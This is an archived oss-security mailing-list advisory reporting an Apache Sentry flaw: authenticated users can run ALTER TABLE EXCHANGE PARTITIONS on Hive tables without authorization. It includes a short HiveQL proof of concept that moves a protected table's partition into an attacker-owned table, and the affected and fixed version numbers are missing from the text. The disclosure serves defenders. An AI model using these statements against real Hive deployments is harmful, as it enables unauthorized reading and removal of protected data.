  oss-security - [SECURITY] Bypass ALTER TABLE EXCHANGE PARTITIONS  authorization for Hive            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Thu, 23 Aug From: Sergio PeĂąa <spena82@...il.com> To: security@...try.apache.org, biglauer@...udera.com,  	oss-security@...ts.openwall.com Cc: dev@...try.apache.org Subject: [SECURITY] Bypass ALTER TABLE EXCHANGE PARTITIONS  authorization for Hive  [SECURITY] Bypass ALTER TABLE EXCHANGE PARTITIONS authorization for Hive  Severity: Major  Vendor: The Apache Software Foundation  Versions Affected: This vulnerability affects only the version of Apache Sentry due to the introduction of Hive 2.x.  Description: An authenticated user can execute ALTER TABLE EXCHANGE PARTITIONS without being authorized by Sentry. This can allow an attacker unauthorized access to the partitioned data of a Sentry protected table and can allow an attacker to remove data from a Sentry protected table.  Mitigation: Apache Sentry users using should upgrade to or later.  Example: The admin has created the following table in a database that the attacker doesn't have access to: > CREATE TABLE target_database1.aliens (name string) PARTITIONED BY (home_planet string, diet string); > ALTER TABLE target_database1.aliens ADD PARTITION (home_planet='earth', diet='milk shakes'); > ALTER TABLE target_database1.aliens ADD PARTITION (home_planet='trapis-4', diet='sentient lifeforms with cheese');  The attacker has a database attacker_database, created as follows: > CREATE TABLE attacker_database.data_stealer (name string) PARTITIONED BY (home_planet string, diet string); > ALTER TABLE attacker_database.data_stealer EXCHANGE PARTITION (home_planet='earth', diet='milk shakes')    WITH TABLE target_database1.aliens;  The attacker now has access to all of the data in the target partitions with the privileges available to them on attacker_database.  Credit: This issue was discovered by Benjamin Iglauer of Cloudera.  References: https://cwiki.apache.org/confluence/display/SENTRY/Vulnerabilities+found+in+Apache+Sentry   Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      